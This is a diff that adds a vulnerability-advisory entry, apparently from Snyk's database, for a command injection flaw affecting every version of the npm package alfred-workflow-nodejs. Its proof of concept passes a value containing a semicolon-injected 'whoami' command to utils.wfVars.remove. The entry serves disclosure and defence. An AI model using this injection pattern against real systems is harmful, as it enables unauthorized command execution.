@@ -1,0 +1,24 @@
+---
+- id: snykio:npm:alfred-workflow-nodejs:608975
+  title: Command Injection
+  description: "[alfred-workflow-nodejs][1] is an Alfred workflow nodejs module\n\nAffected
+    versions of this package are vulnerable to Command Injection.\nIt is possible
+    to inject arbitrary commands by using a semicolon char in\nany of the key values.\n\n###
+    PoC   {#poc}\n\n    var AlfredNode = require('alfred-workflow-nodejs');\n    var
+    utils = AlfredNode.utils;\n    \n    utils.wfVars.remove(' \"; whoami>hacked #',
+    false);\n\n\n\n[1]: https://www.npmjs.com/package/alfred-workflow-nodejs\n"
+  affected_package: alfred-workflow-nodejs
+  vulnerable_versions:
+  - "*"
+  severity: high
+  package_manager: npm
+  cwe:
+  - CWE-78
+  disclosed_date: 2020-08-31
+  created_date: 2020-09-15
+  last_modified_date: 2020-09-15
+  credit:
+  - Asjid Kalam
+  references:
+  - https://github.com/giangvo/alfred-workflow-nodejs/blob/master/alfredNode.js#L401
+  source_url: https://snyk.io/vuln/SNYK-JS-ALFREDWORKFLOWNODEJS-608975
